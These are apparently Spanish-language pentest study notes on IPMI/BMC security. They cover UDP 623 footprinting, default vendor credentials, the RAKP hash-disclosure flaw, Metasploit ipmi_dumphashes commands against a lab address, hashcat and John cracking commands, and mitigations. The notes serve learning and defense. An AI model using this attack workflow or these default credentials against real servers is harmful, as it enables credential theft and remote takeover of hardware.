# IPMI (Intelligent Platform Management Interface)

## Descripción
- Conjunto de especificaciones estandarizadas para **gestión y monitorización remota** de hardware.
- Funciona **independientemente de BIOS, CPU, SO o firmware**.
- Permite administrar sistemas incluso:
  - Antes de que el SO arranque (BIOS settings).
  - Cuando el host está apagado.
  - Tras un fallo del sistema.
- Ofrece funciones de:
  - Monitorización de temperatura, voltajes, ventiladores, PSU.
  - Logs de hardware.
  - Alertas vía SNMP.
  - Actualizaciones remotas.
- Requiere:
  - **BMC (Baseboard Management Controller)**: microcontrolador en la placa.
  - **IPMB / ICMB / IPMI Memory / Interfaces de comunicación** (LAN, serial, PCI).

## Características clave
- Acceso ≈ **acceso físico al servidor**.
- Soportado por más de 200 vendors (Dell, HP, Cisco, Supermicro…).
- Protocolos comunes:
  - Web management console.
  - CLI remoto (Telnet, SSH).
  - IPMI (UDP/623).

## Footprinting
- Puerto: **UDP 623 (ASF-RMCP)**.
- Comando Nmap:
  ```bash
  sudo nmap -sU --script ipmi-version -p 623 <target>
  ```
- Metasploit módulo:
  ```
  use auxiliary/scanner/ipmi/ipmi_version
  ```

## Credenciales por defecto
- **Dell iDRAC** → `root:calvin`
- **HP iLO** → `Administrator:<string aleatorio 8 chars>`
- **Supermicro IPMI** → `ADMIN:ADMIN`

⚠️ Muy comunes durante pentests internos, fácil acceso si no se cambian.

---

## Vulnerabilidad en el protocolo RAKP (IPMI 2.0)
- El proceso de autenticación **RAKP** (Remote Authenticated Key-Exchange Protocol) tiene un fallo de diseño.
- Durante la fase de autenticación:
  1. El cliente solicita autenticación para un **usuario válido**.
  2. El **BMC** responde **antes de autenticar realmente** enviando un **hash SHA1/MD5 del password** (con salt y datos de sesión).
  3. Este hash puede ser capturado por un atacante conectado al puerto **UDP/623**.
- El atacante solo necesita conocer (o adivinar) un **username válido**.
- **Impacto**: recuperación de credenciales válidas sin acceso previo → acceso al BMC = control físico remoto del servidor.

---

## Módulo Metasploit `ipmi_dumphashes`
- Ubicación: `auxiliary/scanner/ipmi/ipmi_dumphashes`.
- **Objetivo**: explotar la vulnerabilidad RAKP para extraer hashes de contraseñas.
- **Funcionamiento**:
  - Envía solicitudes de autenticación al BMC usando una lista de usuarios (`USER_FILE`).
  - El BMC responde con los hashes SHA1/MD5 de esos usuarios.
  - Los guarda en formato compatible con **Hashcat** o **John the Ripper**.
  - Puede probar contraseñas comunes automáticamente (`CRACK_COMMON true`).
- **Uso típico**:
  ```bash
  msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
  msf6 > set RHOSTS 10.129.42.195
  msf6 > set USER_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt
  msf6 > run
  ```
- **Ejemplo de resultado**:
  ```
  [+] 10.129.42.195:623 - IPMI - Hash found: ADMIN:hashSHA1...
  [+] Hash for user 'ADMIN' matches password 'ADMIN'
  ```

---

## Crackeo de hashes IPMI

Los hashes capturados con el módulo `ipmi_dumphashes` pueden crackearse offline.

### 🔹 Hashcat
Modo para IPMI 2.0 RAKP: `-m 7300`  
```bash
# Ataque de diccionario
hashcat -m 7300 -a 0 ipmi_hashes.txt rockyou.txt

# Ataque de máscara (ejemplo: HP iLO, password de 8 caracteres con números y mayúsculas)
hashcat -m 7300 -a 3 ipmi_hashes.txt ?1?1?1?1?1?1?1?1 -1 ?d?u
```

Comando que funcionó:
```bash
hashcat -m 7300 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --username
```

Nota: Si el hash contiene usuario como `admin:hash` poner la opción --username
### 🔹 John the Ripper
```bash
# Crackeo con diccionario
john --wordlist=rockyou.txt ipmi_hashes.txt

# Crackeo incremental
john --incremental ipmi_hashes.txt
```

### 🔹 Ejemplo flujo completo
1. Extraer hashes con Metasploit:  
   ```bash
   use auxiliary/scanner/ipmi/ipmi_dumphashes
   set RHOSTS 10.129.42.195
   run
   ```
2. Guardar los hashes en un archivo (`ipmi_hashes.txt`).
3. Crackear con Hashcat o John.
4. Usar la contraseña descubierta para:
   - Acceder al **BMC web console**.
   - Acceder por **SSH/Telnet** si está habilitado.
   - Verificar **reutilización de contraseñas** en otros sistemas.

---

## Riesgo
- **Muy crítico**: acceso a un BMC equivale a control físico remoto del servidor.
- Suele explotarse en entornos internos porque muchos equipos aún tienen IPMI expuesto con:
  - Credenciales por defecto.
  - Hashes crackeables.
  - Reutilización de contraseñas en otros sistemas críticos.

## Mitigación
- Cambiar credenciales por defecto.
- Usar passwords largos y robustos.
- Segmentar la red → **nunca exponer BMC/IPMI a Internet**.
- Monitorizar intentos de acceso y revisar configuración de seguridad.
